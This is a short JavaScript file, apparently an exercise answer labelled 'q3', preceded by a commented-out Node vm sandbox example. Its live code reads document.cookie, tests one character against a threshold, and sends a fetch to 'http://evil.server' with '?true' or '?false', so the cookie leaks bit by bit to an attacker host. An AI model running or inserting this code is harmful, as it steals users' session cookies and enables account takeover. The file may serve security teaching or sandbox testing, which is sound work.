/*const vm = require('vm');

const x = 1;

const context = { x: 2 };
vm.createContext(context); // Contextify the object.

const code = 'x += 40; var y = 17;';
// `x` and `y` are global variables in the context.
// Initially, x has the value 2 because that is the value of context.x.
vm.runInContext(code, context);

console.log(context.x); // 42
console.log(context.y); // 17

console.log(x); // 1; y is not defined.*/
async function q3_h4x(woops) {
    await fetch(woops)
}

function q3(idx, test) {
    var c = document.cookie;
    var x = "1 + 1 = 3"
    var x_prime = c + x;
    var obj = {lol : x_prime}
    var hacker;
    if(obj.lol[idx] > test ){
        hacker = "http://evil.server/?true";
    } else{
        hacker = "http://evil.server/?false";
    }
    q3_h4x(hacker)

    var nop;
    if(c){
        nop = "nop" ;
    }else{
        nop = "nop"
    }
    return nop + nop;
}